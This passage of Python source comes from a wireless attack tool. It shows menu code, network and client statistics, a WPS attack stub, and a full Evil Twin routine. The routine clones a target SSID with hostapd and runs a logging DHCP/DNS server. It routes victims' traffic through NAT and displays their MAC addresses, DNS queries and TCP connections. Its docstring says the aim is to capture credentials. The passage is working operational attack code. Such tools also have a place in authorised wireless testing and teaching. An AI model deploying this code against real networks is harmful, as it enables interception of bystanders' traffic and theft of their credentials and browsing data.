        self.console.print("[bold yellow]Performing cleanup...[/]")
        self.logger.info("Cleanup process started")
        
        try:
            # Close monitor mode
            subprocess.run(["airmon-ng", "stop", self.interface_name], stdout=subprocess.PIPE)
            self.logger.info(f"{self.interface_name} switched to managed mode")
            time.sleep(1)
            
            # Start NetworkManager
            subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.PIPE)
            self.logger.info("NetworkManager started")
            
            self.console.print("[bold green]Cleanup completed.[/]")
            self.logger.info("Cleanup completed")
        except Exception as e:
            self.logger.error(f"Error during cleanup: {str(e)}")
            self.console.print(f"[bold red]Error during cleanup: {str(e)}[/]")
        
        sys.exit(0)

    def run(self):
        """Main program loop"""
        try:
            while True:
                try:
                    self.show_main_menu()
                except KeyboardInterrupt:
                    if self.current_menu == "main":
                        self.logger.info("Program shutting down...")
                        self.cleanup_and_exit()
                    else:
                        self.logger.info("Returning to main menu")
                        self.console.print("\n[bold yellow]Returning to main menu...[/]")
                        self.current_menu = "main"
                        continue
        except Exception as e:
            self.logger.error(f"Unexpected error: {str(e)}")
            self.cleanup_and_exit()

    def show_network_stats(self):
        """Shows detailed network statistics"""
        if not self.networks:
            self.console.print("[bold red]No networks found. Please scan first![/]")
            return

        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Network Statistics[/]")
        table.add_column("Network", style="cyan")
        table.add_column("Channel", style="green")
        table.add_column("Security", style="yellow")
        table.add_column("Signal", style="blue")
        table.add_column("Clients", style="magenta")
        table.add_column("Data Packets", style="cyan")
        table.add_column("First Seen", style="green")
        table.add_column("Last Seen", style="yellow")

        for bssid, network in self.networks.items():
            table.add_row(
                network['ssid'],
                str(network['channel']),
                network['cipher'],
                str(network['signal']),
                str(len(network['clients'])),
                str(network['data_packets']),
                network['first_seen'].strftime("%H:%M:%S"),
                network['last_seen'].strftime("%H:%M:%S")
            )

        self.console.print(table)

    def client_analysis(self):
        """Analyzes connected clients"""
        if not self.networks:
            self.console.print("[bold red]No networks found. Please scan first![/]")
            return

        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Client Analysis[/]")
        table.add_column("Client MAC", style="cyan")
        table.add_column("Connected To", style="green")
        table.add_column("Network Security", style="yellow")
        table.add_column("Data Packets", style="blue")

        for bssid, network in self.networks.items():
            for client in network['clients']:
                table.add_row(
                    client,
                    network['ssid'],
                    network['cipher'],
                    str(network['data_packets'])
                )

        self.console.print(table)

    def wps_attack(self):
        """Performs WPS attack using Pixie Dust and brute force methods"""
        svc_run_wps_attack(self)

    def _ensure_wireless_iface_exists(self, preferred: str) -> str:
        """Return a wireless netdev that exists under /sys/class/net (handles stale *mon names)."""
        net_base = Path("/sys/class/net")
        candidates: list[str] = []
        if preferred:
            candidates.append(preferred)
            base = managed_name_from_monitor(preferred)
            if base != preferred:
                candidates.append(base)
        try:
            mon = self.wifi_adapter.find_monitor_interface()
            if mon and mon not in candidates:
                candidates.append(mon)
        except Exception:
            pass
        for w in self.wifi_adapter.list_wireless_interfaces():
            if w not in candidates:
                candidates.append(w)
        seen: set[str] = set()
        for name in candidates:
            if not name or name in seen:
                continue
            seen.add(name)
            if (net_base / name).is_dir():
                return name
        raise FileNotFoundError(
            f"No wireless interface found (expected {preferred!r}). "
            "Check `ip link` / `iw dev`, or replug the adapter."
        )

    def _default_ipv4_uplink_interface(self, *, exclude: Optional[set[str]] = None) -> Optional[str]:
        """Device from ``ip -4 route show default``, excluding AP iface(s)."""
        skip = exclude or set()
        try:
            r = subprocess.run(
                ["ip", "-4", "route", "show", "default"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if r.returncode != 0 or not r.stdout.strip():
                return None
            net_base = Path("/sys/class/net")
            for line in r.stdout.strip().splitlines():
                line = line.strip()
                if not line.startswith("default"):
                    continue
                parts = line.split()
                if "dev" not in parts:
                    continue
                idx = parts.index("dev")
                if idx + 1 >= len(parts):
                    continue
                dev = parts[idx + 1]
                if dev in skip:
                    continue
                if (net_base / dev).is_dir():
                    return dev
            return None
        except (subprocess.TimeoutExpired, OSError, ValueError):
            return None

    def _renew_dhcp_on_interface(self, iface: str) -> None:
        """Try to refresh DHCP on an interface after NetworkManager stops (best effort)."""
        if not iface or not (Path("/sys/class/net") / iface).is_dir():
            return
        if shutil.which("dhclient"):
            subprocess.run(
                ["dhclient", "-1", iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=60,
            )
        elif shutil.which("dhcpcd"):
            subprocess.run(
                ["dhcpcd", "-n", iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=60,
            )

    def _interface_is_wireless(self, iface: str) -> bool:
        """True if iface is an 802.11 netdev (/sys/.../wireless exists)."""
        if not iface:
            return False
        try:
            return (Path("/sys/class/net") / iface / "wireless").is_dir()
        except OSError:
            return False

    def _evil_twin_nonwifi_internet_uplink_ok(self, uplink: Optional[str]) -> tuple[bool, str]:
        """
        Evil Twin internet sharing expects a non-Wi-Fi default route (e.g. Ethernet).
        Returns (True, "") if uplink exists and is not wireless; (False, reason) otherwise.
        reason in {"no_uplink", "wifi_uplink"}.
        """
        if not uplink:
            return False, "no_uplink"
        if self._interface_is_wireless(uplink):
            return False, "wifi_uplink"
        return True, ""

    @staticmethod
    def _evil_twin_parse_dnsmasq_query_lines(lines: list[str]) -> list[tuple[str, str, str, str]]:
        """Return up to recent rows (time_hint, client_ip, qname, qtype) from dnsmasq log lines."""
        return svc_parse_dnsmasq_query_lines(lines)

    def _evil_twin_fetch_conntrack_tcp_lan(self) -> list[tuple[str, str, str]]:
        """NAT-forwarded client TCP: visible via conntrack, not local ss/netstat."""
        return svc_fetch_conntrack_tcp_lan()

    @staticmethod
    def _evil_twin_format_bytes(n: int) -> str:
        return svc_format_bytes(n)

    def _evil_twin_conntrack_cli_bytes_for_ip(self, ip: str) -> int:
        """Sum bytes= from conntrack CLI when /proc parse is empty."""
        return svc_conntrack_cli_bytes_for_ip(ip)

    def _evil_twin_nf_conntrack_bytes_for_ip(self, ip: str) -> int:
        """Forwarded/NAT traffic is counted in conntrack, not in iptables FORWARD rule text."""
        return svc_nf_conntrack_bytes_for_ip(ip)

    def _evil_twin_fetch_established_tcp_for_lan(self) -> list[tuple[str, str, str]]:
        """Connections from Evil Twin clients (conntrack NAT) plus local ss/netstat fallback."""
        return svc_fetch_established_tcp_for_lan()

    def evil_twin_attack(self):
        """Creates an Evil Twin access point to capture credentials"""
        # Store original network settings
        original_settings = {}
        original_interface_name = self.interface_name  # Store original interface name
        log_dir: Optional[Path] = None

        # Clear any existing client data and cache
        try:
            # Clear dnsmasq leases file
            subprocess.run(["rm", "-f", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Create empty dnsmasq.leases file and set permissions
            try:
                with open("/var/lib/misc/dnsmasq.leases", 'w') as f:
                    pass  # Create empty file
                # Set proper permissions
                subprocess.run(["chmod", "644", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # Ensure dnsmasq can access the file
                dnsmasq_dir = Path("/var/lib/misc")
                if not dnsmasq_dir.exists():
                    dnsmasq_dir.mkdir(parents=True, exist_ok=True)
                    subprocess.run(["chmod", "755", str(dnsmasq_dir)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                self.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(e)}")
            # Clear any existing evil twin logs
            evil_twin_dir = self.logger.log_dir / "evil_twin"
            if evil_twin_dir.exists():
                for file in evil_twin_dir.glob("*"):
                    try:
                        file.unlink()
                    except:
                        pass
        except Exception as e:
            self.logger.log_evil_twin(f"Warning: Could not clear previous cache: {str(e)}")

        try:
            # Get original network settings
            self.console.print("[bold blue]Saving original network settings...[/]")
            try:
                resolved = self._ensure_wireless_iface_exists(self.interface_name)
            except FileNotFoundError as e:
                self.console.print(f"[bold red]{e}[/]")
                return
            if resolved != self.interface_name:
                self.logger.log_evil_twin(
                    f"Resolved interface {self.interface_name!r} -> {resolved!r} (stale or missing name)"
                )
                self.console.print(
                    f"[yellow]Using interface [cyan]{resolved}[/] "
                    f"([dim]{self.interface_name}[/] is not present).[/]"
                )
                self.interface_name = resolved

            mon_iface = self.wifi_adapter.find_monitor_interface()
            if mon_iface == self.interface_name:
                self.console.print(
                    "[bold blue]Switching to managed mode for Evil Twin AP (hostapd requires AP/managed).[/]"
                )
                self.logger.log_evil_twin("Switching monitor interface to managed for hostapd")
                self.interface_name = self.wifi_adapter.set_managed_mode(
                    self.interface_name,
                    restart_network_manager=False,
                )

            original_settings['ip_forward'] = subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"]).decode().strip()
            original_settings['interface_state'] = subprocess.check_output(["ip", "addr", "show", self.interface_name]).decode()
            original_settings['route_table'] = subprocess.check_output(["ip", "route", "show"]).decode()
            original_settings["evil_twin_uplink"] = self._default_ipv4_uplink_interface(
                exclude={self.interface_name}
            )
            original_settings['iptables'] = subprocess.check_output(["iptables-save"]).decode()
            original_settings['resolved_status'] = subprocess.run(["systemctl", "is-active", "systemd-resolved"], 
                                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
            original_settings['network_manager_status'] = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
                                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
            original_settings['wpa_supplicant_status'] = subprocess.run(["systemctl", "is-active", "wpa_supplicant"], 
                                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
            
            # Save WiFi connection info if available
            try:
                original_settings['wifi_connections'] = subprocess.check_output(["nmcli", "-t", "-f", "NAME,UUID,TYPE", "connection", "show"]).decode()
            except Exception:
                original_settings['wifi_connections'] = ""

            # Get network info
            default_ssid = ""
            default_channel = "1"
            if self.selected_network:
                network = self.networks[self.selected_network]
                default_ssid = network['ssid']
                default_channel = str(network['channel'])
                self.console.print(f"\n[bold yellow]Selected network: {default_ssid} (Channel: {default_channel})[/]")
            
            
            # Ask for SSID (with default if network is selected)
            ssid = Prompt.ask("Enter SSID for the Evil Twin", default=default_ssid)
            if not ssid and default_ssid:
                ssid = default_ssid
                self.console.print(f"[bold cyan]Using selected network SSID: {ssid}[/]")
            
            # Ask for channel (with default if network is selected)
            channel_input = Prompt.ask("Enter channel (1-11)", default=default_channel)
            try:
                channel = int(channel_input)
                if channel < 1 or channel > 11:
                    self.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
                    channel = 1
            except (TypeError, ValueError):
                self.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
                channel = 1
        
            # Ask for WPA2-PSK configuration
            use_wpa2 = Prompt.ask("Enable WPA2-PSK security? (y/n)", choices=["y", "n"]) == "y"
            if use_wpa2:
                wpa_passphrase = Prompt.ask("Enter WPA2 passphrase (8-63 characters)")
                if len(wpa_passphrase) < 8 or len(wpa_passphrase) > 63:
                    self.console.print("[bold red]Invalid passphrase length! Using default: 12345678[/]")
                    wpa_passphrase = "12345678"
        
            uplink_precheck = original_settings.get("evil_twin_uplink")
            uplink_ok, uplink_reason = self._evil_twin_nonwifi_internet_uplink_ok(uplink_precheck)
            if not uplink_ok:
                if uplink_reason == "no_uplink":
                    self.console.print(
                        "[yellow]No IPv4 default route was found on an interface other than this AP. "
                        "Plug in Ethernet (or another non-Wi-Fi path to the internet). "
                        "Clients on the Evil Twin network will probably NOT get online.[/]"
                    )
                    self.logger.log_evil_twin("Precheck: no uplink excluding AP iface")
                else:
                    self.console.print(
                        "[yellow]Your current default route uses a Wi-Fi interface (not a wired/other uplink). "
                        "For reliable client internet, use Ethernet or USB tethering while the AP runs on this adapter. "
                        "Connected clients may NOT reach the internet.[/]"
                    )
                    self.logger.log_evil_twin(f"Precheck: uplink {uplink_precheck!r} is wireless")
                if Prompt.ask("Continue with Evil Twin anyway?", choices=["y", "n"]) != "y":
                    self.console.print("[meta]Evil Twin cancelled.[/]")
                    return
            elif uplink_precheck:
                self.console.print(
                    f"[success]Non-Wi-Fi uplink OK:[/] [cyan]{uplink_precheck}[/] "
                    "(clients can use NAT/DNS if routing stays up after services stop)."
                )

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Log Evil Twin attack start
            self.logger.log_evil_twin("Attack started", ssid=ssid, channel=channel, security="WPA2" if use_wpa2 else "Open")
            
            # Create necessary directories
            log_dir = self.logger.log_dir / "evil_twin"
            log_dir.mkdir(exist_ok=True)
            
            # Create hostapd configuration
            hostapd_conf = f"""interface={self.interface_name}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=1
ieee80211n=1
ht_capab=[HT40+][SHORT-GI-40][DSSS_CCK-40]"""

            if use_wpa2:
                hostapd_conf += f"""
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase={wpa_passphrase}
wpa_pairwise=CCMP
rsn_pairwise=CCMP"""

            # Create dnsmasq configuration
            # Clients must use the AP (192.168.1.1) as DNS so queries are logged; upstream is 8.8.4.4 first.
            dnsmasq_conf = f"""interface={self.interface_name}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
log-queries
log-dhcp
log-facility={log_dir}/dnsmasq.log
log-async=20
listen-address=192.168.1.1
bind-interfaces
no-resolv
server=8.8.4.4
server=8.8.8.8
dhcp-leasefile={log_dir}/dnsmasq.leases"""

            # Stop network services
            self.console.print("[bold blue]Preparing network environment...[/]")
            self.logger.log_evil_twin("Stopping network services")
            subprocess.run(["systemctl", "stop", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["systemctl", "stop", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["killall", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["killall", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)

            uplink = original_settings.get("evil_twin_uplink")
            if uplink and uplink != self.interface_name:
                self.console.print(f"[bold blue]Refreshing DHCP on uplink {uplink} (internet exit)...[/]")
                self.logger.log_evil_twin(f"Renewing DHCP on uplink {uplink} after stopping NetworkManager")
                self._renew_dhcp_on_interface(uplink)
                time.sleep(2)
                uplink_live = self._default_ipv4_uplink_interface(exclude={self.interface_name})
                if uplink_live:
                    uplink = uplink_live
                    original_settings["evil_twin_uplink"] = uplink
                else:
                    self.console.print(
                        "[yellow]No default route after NM stop. Use Ethernet (or second NIC) with DHCP for internet uplink.[/]"
                    )

            # Configure interface
            self.console.print("[bold blue]Configuring network interface...[/]")
            self.logger.log_evil_twin("Configuring network interface")
            subprocess.run(["rfkill", "unblock", "all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "flush", "dev", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)

            # Write configurations
            hostapd_path = log_dir / "hostapd.conf"
            dnsmasq_path = log_dir / "dnsmasq.conf"
            
            with open(hostapd_path, "w") as f:
                f.write(hostapd_conf)
            with open(dnsmasq_path, "w") as f:
                f.write(dnsmasq_conf)

            # Start Evil Twin AP
            self.console.print("[bold blue]Starting Evil Twin access point...[/]")
            self.logger.log_evil_twin("Starting access point")
            hostapd_proc = subprocess.Popen(["hostapd", str(hostapd_path)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(3)
            
            # Check if hostapd started successfully
            if hostapd_proc.poll() is not None:
                self.logger.log_evil_twin("Failed to start hostapd", error=True)
                raise Exception("Failed to start hostapd. Check your wireless adapter.")
            
            # Start DHCP server
            self.logger.log_evil_twin("Starting DHCP server")
            dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(2)
            
            if dnsmasq_proc.poll() is not None:
                self.logger.log_evil_twin("Failed to start dnsmasq", error=True)
                raise Exception("Failed to start dnsmasq. Check configuration.")

            # Enable IPv4 forwarding; NAT/LAN masquerade out the real uplink (was wrongly bound to the AP iface)
            subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            wan_iface = original_settings.get("evil_twin_uplink")
            if not wan_iface or wan_iface == self.interface_name:
                wan_iface = self._default_ipv4_uplink_interface(exclude={self.interface_name})
            if wan_iface == self.interface_name:
                wan_iface = None
            if wan_iface and not (Path("/sys/class/net") / wan_iface).is_dir():
                wan_iface = None

            self.logger.log_evil_twin("Configuring iptables for Evil Twin internet sharing")
            subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            evil_twin_lan = "192.168.1.0/24"
            if wan_iface:
                subprocess.run(
                    [
                        "iptables",
                        "-t",
                        "nat",
                        "-A",
                        "POSTROUTING",
                        "-s",
                        evil_twin_lan,
                        "-o",
                        wan_iface,
                        "-j",
                        "MASQUERADE",
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                subprocess.run(
                    [
                        "iptables",
                        "-A",
                        "FORWARD",
                        "-i",
                        self.interface_name,
                        "-o",
                        wan_iface,
                        "-j",
                        "ACCEPT",
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                subprocess.run(
                    [
                        "iptables",
                        "-A",
                        "FORWARD",
                        "-i",
                        wan_iface,
                        "-o",
                        self.interface_name,
                        "-j",
                        "ACCEPT",
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self.console.print(
                    f"[success]Internet sharing on[/] — NAT [dim]{evil_twin_lan}[/] → [cyan]{wan_iface}[/] "
                    f"(AP [cyan]{self.interface_name}[/])"
                )
                self.logger.log_evil_twin(
                    f"NAT/forward: LAN {evil_twin_lan} via AP {self.interface_name} masq out {wan_iface}"
                )
            else:
                subprocess.run(
                    ["iptables", "-A", "FORWARD", "-i", self.interface_name, "-j", "ACCEPT"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self.console.print(
                    "[warning]No WAN uplink detected — clients join the lab AP but may not reach the internet. "
                    "Connect Ethernet (default route) or a second online interface.[/]"
                )
                self.logger.log_evil_twin("No WAN iface; NAT skipped, permissive FORWARD from AP only")

            try:
                acct = subprocess.run(
                    ["sysctl", "-n", "net.netfilter.nf_conntrack_acct"],
                    capture_output=True,
                    text=True,
                    timeout=3,
                )
                if acct.returncode == 0:
                    original_settings["nf_conntrack_acct"] = acct.stdout.strip()
                else:
                    original_settings["nf_conntrack_acct"] = None
                subprocess.run(
                    ["sysctl", "-w", "net.netfilter.nf_conntrack_acct=1"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            except Exception:
                original_settings["nf_conntrack_acct"] = None

            dnsmasq_log = log_dir / "dnsmasq.log"
            if not dnsmasq_log.exists():
                dnsmasq_log.touch()

            with Live(refresh_per_second=4) as live:
                start_time = time.time()
                clients_connected = {}  # Reset clients dictionary
                tcp_connections: list[tuple[str, str, str]] = []
                tcp_poll = {"last": 0.0}

                # Create cache directory for this session
                cache_dir = Path("/tmp/wifiangel_evil_twin")
                cache_dir.mkdir(exist_ok=True)
                session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
                session_file = cache_dir / f"clients_{session_id}.json"
                
                # Clear any existing dnsmasq leases
                leases_file = log_dir / "dnsmasq.leases"
                
                # Create empty dnsmasq.leases file and set permissions
                try:
                    # Ensure file exists
                    leases_file.touch(exist_ok=True)
                    # Set proper permissions
                    subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except Exception as e:
                    self.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(e)}")

                while True:
                    # Create main status table
                    status_table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Evil Twin Status[/]")
                    status_table.add_column("Evil Twin SSID", style="cyan")
                    status_table.add_column("Channel", style="green")
                    status_table.add_column("Security", style="yellow")
                    status_table.add_column("AP Status", style="magenta")
                    status_table.add_column("Running Time", style="cyan")
                    
                    elapsed = int(time.time() - start_time)
                    time_str = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
                    
                    security_str = f"WPA2-PSK ({wpa_passphrase})" if use_wpa2 else "Open"
                    
                    # Check AP status
                    ap_status = "[bold green]Active"
                    if hostapd_proc.poll() is not None or dnsmasq_proc.poll() is not None:
                        ap_status = "[bold red]Error"
                        self.logger.log_evil_twin("Service crashed, attempting restart")
                        # Try to restart services if they've crashed
                        if hostapd_proc.poll() is not None:
                            hostapd_proc = subprocess.Popen(["hostapd", str(hostapd_path)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        if dnsmasq_proc.poll() is not None:
                            dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    
                    status_table.add_row(ssid, str(channel), security_str, ap_status, time_str)

                    now = time.time()
                    if now - tcp_poll["last"] >= 5.0:
                        tcp_poll["last"] = now
                        try:
                            tcp_connections = self._evil_twin_fetch_established_tcp_for_lan()
                        except Exception:
                            tcp_connections = []

                    # Create TCP connections table
                    tcp_table = Table(show_header=True, header_style="bold blue", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Active TCP ESTABLISHED Connections[/] (refresh ~5s, uses ss/netstat)")
                    tcp_table.add_column("Local Address", style="cyan")
                    tcp_table.add_column("Remote Address", style="green")
                    tcp_table.add_column("State", style="yellow")
                    
                    for local, remote, state in tcp_connections:
                        tcp_table.add_row(local, remote, state)

                    # Create DNS queries table
                    dns_table = Table(show_header=True, header_style="bold green", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Recent DNS Queries[/]")
                    dns_table.add_column("Time", style="cyan")
                    dns_table.add_column("Client IP", style="green")
                    dns_table.add_column("Query", style="yellow")
                    dns_table.add_column("Type", style="magenta")

                    if dnsmasq_log.exists():
                        try:
                            with open(dnsmasq_log, "r", errors="replace") as f:
                                dns_parsed = self._evil_twin_parse_dnsmasq_query_lines(f.readlines())
                            for time_hint, client_ip, query_name, query_type in dns_parsed:
                                dns_table.add_row(time_hint, client_ip, query_name, query_type)
                        except OSError:
                            pass

                    # Create clients table
                    clients_table = Table(show_header=True, header_style="bold yellow", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Connected Clients[/]")
                    clients_table.add_column("MAC Address", style="cyan")
                    clients_table.add_column("IP Address", style="green")
                    clients_table.add_column("Connected Since", style="yellow")
                    clients_table.add_column("Data Transferred", style="magenta")

                    # Update connected clients from dnsmasq leases
                    try:
                        leases_file = log_dir / "dnsmasq.leases"
                        if leases_file.exists():
                            with open(leases_file, "r") as f:
                                leases = f.readlines()
                                current_clients = {}  # Temporary dictionary for current clients
                                for lease in leases:
                                    parts = lease.split()
                                    if len(parts) >= 5:
                                        mac = parts[1]
                                        ip = parts[2]
                                        hostname = parts[3]
                                        if ip.startswith("192.168.1."):  # Only show clients from Evil Twin network
                                            prior = clients_connected.get(mac)
                                            if (
                                                prior
                                                and prior.get("ip") == ip
                                                and prior.get("connected_since")
                                            ):
                                                first_seen = prior["connected_since"]
                                            else:
                                                first_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                            current_clients[mac] = {
                                                "ip": ip,
                                                "hostname": hostname,
                                                "connected_since": first_seen,
                                            }
                                            if mac not in clients_connected:
                                                # Log new client connection
                                                self.logger.log_evil_twin(f"New client connected: {mac} ({ip})")
                                                
                                # Update clients_connected with current clients only
                                clients_connected = current_clients
                                
                                # Save current clients to session file
                                try:
                                    with open(session_file, 'w') as f:
                                        json.dump(clients_connected, f)
                                except:
                                    pass
                    except:
                        pass

                    for mac, details in clients_connected.items():
                        b = self._evil_twin_nf_conntrack_bytes_for_ip(details["ip"])
                        data_transferred = self._evil_twin_format_bytes(b)

                        clients_table.add_row(
                            mac,
                            details["ip"],
                            details["connected_since"],
                            data_transferred,
                        )

                    # Update display with all tables (no Panel title: tables already have titles; duplicate titles ghost in Live)
                    live.update(Group(
                        status_table,
                        Panel(clients_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                        Panel(dns_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                        Panel(tcp_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                    ))

                    time.sleep(1)

        except KeyboardInterrupt:
            self.logger.log_evil_twin("Attack stopped by user")
            self.console.print("\n[bold yellow]Evil Twin attack stopped by user.[/]")
        except Exception as e:
            self.logger.log_evil_twin(f"Error during attack: {str(e)}", error=True)
            self.console.print(f"\n[bold red]Error during Evil Twin attack: {str(e)}[/]")
        finally:
            # Cleanup and restore original settings
            self.cleanup_evil_twin(original_settings, log_dir)
            self.current_menu = "attack"

    def cleanup_evil_twin(self, original_settings, log_dir=None):
        """Cleanup Evil Twin attack resources"""
        log_dir = resolve_evil_twin_log_dir(self.logger.log_dir, log_dir)
        self.console.print("[bold blue]Cleaning up and restoring network settings...[/]")
        self.logger.log_evil_twin("Starting cleanup process")
        
        try:
            # Clear cache and temporary files
            cache_dir = Path("/tmp/wifiangel_evil_twin")
            if cache_dir.exists():
                try:
                    shutil.rmtree(cache_dir)
                except:
                    pass
            
            # Clear dnsmasq leases
            try:
                leases_file = log_dir / "dnsmasq.leases"
                if leases_file.exists():
                    # Just empty the file instead of removing it
                    with open(leases_file, 'w') as f:
                        pass  # Create empty file
                    # Set proper permissions
                    subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

            # Kill all related processes
            self.logger.log_evil_twin("Stopping all related processes")
            processes_to_kill = ["hostapd", "dnsmasq", "dhcpd", "wpa_supplicant"]
            for proc in processes_to_kill:
                subprocess.run(["killall", "-9", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Reset IP forwarding
            if 'ip_forward' in original_settings:
                self.logger.log_evil_twin("Resetting IP forwarding")
                subprocess.run(["sysctl", f"net.ipv4.ip_forward={original_settings['ip_forward']}"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            prev_acct = original_settings.get("nf_conntrack_acct")
            if prev_acct is not None:
                subprocess.run(
                    ["sysctl", "-w", f"net.netfilter.nf_conntrack_acct={prev_acct}"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            
            # Reset iptables
            self.logger.log_evil_twin("Resetting iptables")
            subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "mangle", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-X"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Restore saved iptables rules
            if 'iptables' in original_settings:
                try:
                    with tempfile.NamedTemporaryFile(mode='w+') as f:
                        f.write(original_settings['iptables'])
                        f.flush()
                        subprocess.run(["iptables-restore", f.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    self.logger.log_evil_twin("Failed to restore iptables configuration", error=True)
            
            # Stop monitor mode and switch back to managed mode
            if 'mon' in self.interface_name:
                try:
                    subprocess.run(["airmon-ng", "stop", self.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.interface_name = self.interface_name.replace('mon', '')
                except:
                    self.logger.log_evil_twin("Failed to stop monitor mode using airmon-ng", error=True)
            
            # Ensure interface is in managed mode
            subprocess.run(["ip", "link", "set", self.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iw", self.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "set", self.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Restart network services in correct order
            if 'resolved_status' in original_settings and original_settings['resolved_status'] == 'active':
                subprocess.run(["systemctl", "restart", "systemd-resolved"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if 'wpa_supplicant_status' in original_settings and original_settings['wpa_supplicant_status'] == 'active':
                subprocess.run(["systemctl", "restart", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if 'network_manager_status' in original_settings and original_settings['network_manager_status'] == 'active':
                subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.console.print("[success]Network settings restored successfully.[/]")
            self.console.print("[success]Interface switched back to managed mode.[/]")
